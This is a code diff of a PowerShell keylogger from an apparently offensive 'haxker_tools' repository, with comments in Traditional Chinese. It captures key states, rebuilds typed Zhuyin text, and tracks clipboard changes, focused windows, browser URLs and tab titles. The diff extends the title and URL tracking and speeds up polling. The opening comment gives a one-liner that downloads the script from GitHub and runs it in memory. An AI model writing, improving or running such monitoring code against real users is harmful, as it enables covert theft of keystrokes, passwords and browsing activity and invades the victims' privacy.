@@ -1,5 +1,5 @@
 # 請使用以下方法進行參數傳送
-# & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 300
+# & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 180
 
 param(
     [Parameter(Mandatory=$true)]
@@ -438,6 +438,7 @@ $keyStateBuffer = New-Object byte[] 256
 $startTime = [DateTime]::Now
 $lastLanguage = Get-CurrentLanguage
 $lastHwnd = [IntPtr]::Zero
+$lastTitle = ""
 $lastClipSeq = $type::GetClipboardSequenceNumber()
 $lastUrl = ""
 $lastUrlCheckTime = [DateTime]::Now
@@ -473,11 +474,12 @@ while ($true) {
         }
     }
 
-    # 1. 視窗切換監控與瀏覽器網址擷取
+    # 1. 視窗切換監控與瀏覽器網址/標題擷取
     $winInfo = Get-FocusedWindowInfo
     if ($winInfo -and $winInfo.Hwnd -ne $lastHwnd) {
         Flush-TextBuffer
         $lastHwnd = $winInfo.Hwnd
+        $lastTitle = $winInfo.Title
         if ($comboActive) { Write-Host ""; $comboActive = $false }
         $canErasePreviousSinglePress = $false
         Write-Host "$(Get-TimeStamp)$($winInfo.Formatted)" -ForegroundColor Cyan
@@ -488,14 +490,33 @@ while ($true) {
         }
     }
 
-    # 2. 瀏覽器內部網址變更持續監控
-    if ($winInfo -and ([DateTime]::Now - $lastUrlCheckTime).TotalMilliseconds -gt 800) {
+    # 2. 瀏覽器內部網址與分頁標題變更持續監控
+    if ($winInfo -and ([DateTime]::Now - $lastUrlCheckTime).TotalMilliseconds -gt 500) {
         $lastUrlCheckTime = [DateTime]::Now
+
+        $sb = New-Object System.Text.StringBuilder 512
+        $null = $type::GetWindowText($winInfo.Hwnd, $sb, $sb.Capacity)
+        $currentTitle = $sb.ToString()
         $currentUrl = $type::GetBrowserUrl($winInfo.Hwnd, $winInfo.Process)
-        if ($currentUrl -and $currentUrl -ne $lastUrl) {
-            $lastUrl = $currentUrl
+
+        $titleChanged = ($currentTitle -and $currentTitle -ne $lastTitle)
+        $urlChanged   = ($currentUrl -and $currentUrl -ne $lastUrl)
+
+        if ($titleChanged -or $urlChanged) {
+            if ($currentTitle) { $lastTitle = $currentTitle }
+            if ($currentUrl) { $lastUrl = $currentUrl }
+
             if ($comboActive) { Write-Host ""; $comboActive = $false }
-            Write-Host "$(Get-TimeStamp)🌐 [網址變更] -> $currentUrl" -ForegroundColor Green
+
+            $procLower = $winInfo.Process.ToLower()
+            $isBrowser = $procLower.Contains("chrome") -or $procLower.Contains("msedge") -or $procLower.Contains("firefox") -or $procLower.Contains("brave") -or $procLower.Contains("opera")
+
+            if ($isBrowser) {
+                $displayUrl = if ($currentUrl) { $currentUrl } else { $lastUrl }
+                Write-Host "$(Get-TimeStamp)🌐 [網頁分頁切換] -> 標題: `"$lastTitle`" | 網址: $displayUrl" -ForegroundColor Green
+            } elseif ($titleChanged) {
+                Write-Host "$(Get-TimeStamp)📌 [標題變更] -> `"$lastTitle`"" -ForegroundColor Cyan
+            }
         }
     }
 
@@ -611,11 +632,10 @@ while ($true) {
                                     }
                                 } elseif ($zhuyinInitials.ContainsKey($chLower)) {
                                     $script:zhInitial = $zhuyinInitials[$chLower]
-                                    if ($script:zhHistory.Contains('I')) { $null = $script:zhHistory.Remove('I') } # 已修復：加上 $null = 吸收 True
+                                    if ($script:zhHistory.Contains('I')) { $null = $script:zhHistory.Remove('I') }
                                     $script:zhHistory.Add('I')
                                 } elseif ($zhuyinMedials.ContainsKey($chLower)) {
                                     $medialChar = $zhuyinMedials[$chLower]
-                                    # 若輸入介母 ㄨ，自動清除不相容的舊韻母 (如 ㄜ)
                                     if ($script:zhFinal -and $medialChar -eq 'ㄨ') {
                                         $validFinalsForU = @('ㄚ', 'ㄛ', 'ㄞ', 'ㄟ', 'ㄢ', 'ㄣ', 'ㄤ', 'ㄥ')
                                         if ($validFinalsForU -notcontains $script:zhFinal) {
@@ -623,11 +643,11 @@ while ($true) {
                                         }
                                     }
                                     $script:zhMedial = $medialChar
-                                    if ($script:zhHistory.Contains('M')) { $null = $script:zhHistory.Remove('M') } # 已修復：加上 $null = 吸收 True
+                                    if ($script:zhHistory.Contains('M')) { $null = $script:zhHistory.Remove('M') }
                                     $script:zhHistory.Add('M')
                                 } elseif ($zhuyinFinals.ContainsKey($chLower)) {
                                     $script:zhFinal = $zhuyinFinals[$chLower]
-                                    if ($script:zhHistory.Contains('F')) { $null = $script:zhHistory.Remove('F') } # 已修復：加上 $null = 吸收 True
+                                    if ($script:zhHistory.Contains('F')) { $null = $script:zhHistory.Remove('F') }
                                     $script:zhHistory.Add('F')
                                 } else {
                                     Commit-ZhuyinSyllable
